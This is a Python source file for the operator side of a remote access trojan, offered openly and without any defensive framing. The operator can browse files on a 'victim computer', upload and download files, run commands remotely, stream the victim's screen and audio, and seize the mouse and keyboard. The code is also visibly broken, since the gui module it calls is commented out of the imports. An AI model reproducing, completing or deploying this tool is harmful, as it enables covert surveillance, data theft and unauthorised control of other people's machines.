# import my stuff
from consts import *
import files
import misc
#import gui
import utils

"""
Print list of all available commands
"""
def printHelp():
	print("cd [directory] - change current directory")
	print("ls/dir - list directory contents")
	print("upload [local file] [remote file] - upload file to victim computer")
	print("download [remote file] [local file] - download file from victim computer")
	print("exec [command line] - run command from command prompt on victim computer")
	print("video [start/stop] - start or stop streaming victim's screen")
	print("audio [start/stop] - start or stop streaming victim's audio")
	print("mouse [start/stop] - start or stop controlling victim's mouse")
	print("keys [start/stop] - start or stop controlling victim's keyboard")
	print("terminate - stop the client on the victim's computer")
	print("exit/stop/quit - stop the command server (this process)")
	print("help - display this list of available commands")

"""
Handle each command given by the user
If an unknown input is given, the command list is printed
"""
def handleCommand(cmd, mainSock):
	if cmd.startswith('cd'):
		files.handleCD(cmd[3:], mainSock)
	elif cmd.startswith('ls') or cmd.startswith('dir'):
		files.handleLS(cmd, mainSock)
	elif cmd.startswith('upload'):
		files.handleUpload(cmd, mainSock)
	elif cmd.startswith('download'):
		files.handleDownload(cmd, mainSock)
	elif cmd.startswith('exec'):
		misc.handleExec(cmd[5:], mainSock)
	elif cmd.split(' ')[0] in ['video', 'audio', 'mouse', 'keys']:
		args = cmd.split(' ')
		if len(args) != 2 or args[1] not in ['start', 'stop']:
			print('Incorrecct command usage! Use "help" to see commands and how to use them')
			return
		toggle = args[1] == 'start'
		if args[0] == 'video':
			gui.toggleVideo(toggle, mainSock)
		elif args[0] == 'audio':
			gui.toggleAudio(toggle, mainSock)
		elif args[0] == 'mouse':
			gui.toggleMouse(toggle, mainSock)
		elif args[0] == 'keys':
			gui.toggleKeys(toggle, mainSock)
		else:
			print('Incorrecct command usage! Use "help" to see commands and how to use them')
	elif cmd == 'terminate':
		mainSock.sendall(bytes([KILL_PROC, 0]))
	else:
		if cmd != 'help':
			print('Unknown command provided! Printing list of available commands...')
		printHelp()

"""
Receive commands until 'exit', 'stop', or 'quit' is received
All other inputs are passed to the command handler
"""
def commandInputLoop(mainSock):
	cmd = input(f'{files.currentDirectory}>')
	while cmd not in ['exit', 'stop', 'quit']:
		handleCommand(cmd, mainSock)
		cmd = input(f'{files.currentDirectory}>')

"""
Main method, very basic
"""
def main():
	# oepn server socket and wait for a connection
	mainSock = utils.openConnection(CMD_PORT)

	# send command for 'cd .' to receive the current directory
	files.handleCD('.', mainSock)

	# run the main command loop
	commandInputLoop(mainSock)

	# close the main socket
	mainSock.close()

if __name__ == "__main__":
	main()